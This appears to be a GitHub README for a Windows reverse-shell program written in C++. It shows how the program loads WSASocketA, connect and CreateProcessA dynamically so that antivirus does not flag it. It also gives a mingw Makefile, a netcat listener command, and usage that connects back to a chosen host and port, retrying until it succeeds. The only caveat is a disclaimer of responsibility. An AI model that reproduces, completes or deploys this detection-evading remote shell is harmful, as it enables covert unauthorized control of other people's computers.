# Windows Reverse Shell
![detection](https://github.com/user-attachments/assets/157c1291-4489-4cce-914a-4829ac631f45)

## Avoiding  Detection
For avoiding detection I defined manually the "sketchy" functions so they can be loaded dynamically by kernel32.dll,and ws2_32.dll
```cpp
...
typedef SOCKET(WINAPI *pWSASocketA)(int, int, int, LPWSAPROTOCOL_INFOA, GROUP, DWORD);
typedef int(WINAPI *pconnect)(SOCKET, const sockaddr *, int);
typedef BOOL(WINAPI *pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);

int main(int argc, char const *argv[])

{
    if (argc == 3)
    {
        HMODULE hWS2_32 = GetModuleHandleW(L"ws2_32.dll");
        HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
        pWSASocketA fWSASocketA = (pWSASocketA)GetProcAddress(hWS2_32, "WSASocketA");
        pconnect fconnect = (pconnect)GetProcAddress(hWS2_32, "connect");
        pCreateProcessA fCreateProcessA = (pCreateProcessA)GetProcAddress(hKernel32, "CreateProcessA");
...
```
## Compile
Remember to set the proper compiler in the `Makefile`
### Example
```Makefile
CC= x86_64-w64-mingw32-g++
CFLAGS= -O2 -Wall -fstack-protector-all -fcf-protection=full
LDLIBS= -lws2_32
program: main.cpp
	${CC} ${CFLAGS} -o program main.cpp ${LDLIBS}
```
To compile just enter
```
make
```
## Running the reverse hell
Remember to have your listener ready
```
sudo nc -lvnp 443
```
## Usage
```
./program.exe HOST PORT
```
### Example
```
./program.exe 127.0.0.1 443
```
If it connects it should output
```
[+] Connected
```
If not, it will keep waiting for a connection
```
[!] Couldn't connect, retrying...
[!] Couldn't connect, retrying...
[!] Couldn't connect, retrying...
```
## Warning
I'm not responsible for what you do with this program
